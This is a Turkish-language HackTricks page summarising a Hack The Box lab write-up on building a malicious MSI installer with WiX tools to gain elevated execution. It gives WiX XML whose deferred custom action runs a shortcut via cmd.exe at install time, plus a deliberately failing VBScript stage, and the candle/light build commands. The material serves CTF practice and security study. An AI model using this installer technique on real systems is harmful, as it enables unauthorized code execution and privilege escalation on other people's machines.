{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

# Kötü Amaçlı MSI Oluşturma ve Root Elde Etme

MSI yükleyicisinin oluşturulması wixtools kullanılarak yapılacaktır, özellikle [wixtools](http://wixtoolset.org) kullanılacaktır. Alternatif MSI oluşturucularının denendiği, ancak bu özel durumda başarılı olunamadığı belirtilmelidir.

Wix MSI kullanım örnekleri hakkında kapsamlı bir anlayış için, [bu sayfaya](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with) danışılması önerilir. Burada, wix MSI kullanımını gösteren çeşitli örnekler bulabilirsiniz.

Amaç, lnk dosyasını çalıştıracak bir MSI oluşturmaktır. Bunu başarmak için aşağıdaki XML kodu kullanılabilir ([xml buradan](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)):
```markup
<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
<Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product Name"
Version="0.0.1" Manufacturer="@_xpn_" Language="1033">
<Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
<Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
<Directory Id="TARGETDIR" Name="SourceDir">
<Directory Id="ProgramFilesFolder">
<Directory Id="INSTALLLOCATION" Name="Example">
<Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">
</Component>
</Directory>
</Directory>
</Directory>
<Feature Id="DefaultFeature" Level="1">
<ComponentRef Id="ApplicationFiles"/>
</Feature>
<Property Id="cmdline">cmd.exe /C "c:\users\public\desktop\shortcuts\rick.lnk"</Property>
<CustomAction Id="Stage1" Execute="deferred" Directory="TARGETDIR" ExeCommand='[cmdline]' Return="ignore"
Impersonate="yes"/>
<CustomAction Id="Stage2" Execute="deferred" Script="vbscript" Return="check">
fail_here
</CustomAction>
<InstallExecuteSequence>
<Custom Action="Stage1" After="InstallInitialize"></Custom>
<Custom Action="Stage2" Before="InstallFiles"></Custom>
</InstallExecuteSequence>
</Product>
</Wix>
```
Önemli bir nokta, Package öğesinin InstallerVersion ve Compressed gibi öznitelikler içerdiğidir; bu öznitelikler, yükleyici sürümünü belirtir ve paketin sıkıştırılıp sıkıştırılmadığını gösterir.

Oluşturma süreci, msi.xml'den bir wixobject oluşturmak için wixtools'tan candle.exe aracını kullanmayı içerir. Aşağıdaki komut çalıştırılmalıdır:
```
candle.exe -out C:\tem\wix C:\tmp\Ethereal\msi.xml
```
Ayrıca, gönderide komut ve çıktısını gösteren bir görüntü sağlandığına değinmekte fayda var. Görsel rehberlik için buna başvurabilirsiniz.

Ayrıca, wixobject'ten MSI dosyası oluşturmak için wixtools'tan başka bir araç olan light.exe kullanılacaktır. Çalıştırılacak komut aşağıdaki gibidir:
```
light.exe -out C:\tm\Ethereal\rick.msi C:\tmp\wix
```
Benzer şekilde, önceki komutla birlikte, komutu ve çıktısını gösteren bir resim gönderide yer almaktadır.

Lütfen bu özetin değerli bilgiler sağlamayı amaçladığını, ancak daha kapsamlı ayrıntılar ve doğru talimatlar için orijinal gönderiye başvurulmasının önerildiğini unutmayın.

## Referanslar
* [https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)
* [https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with)
[wixtools](http://wixtoolset.org)


{% hint style="success" %}
AWS Hacking öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}
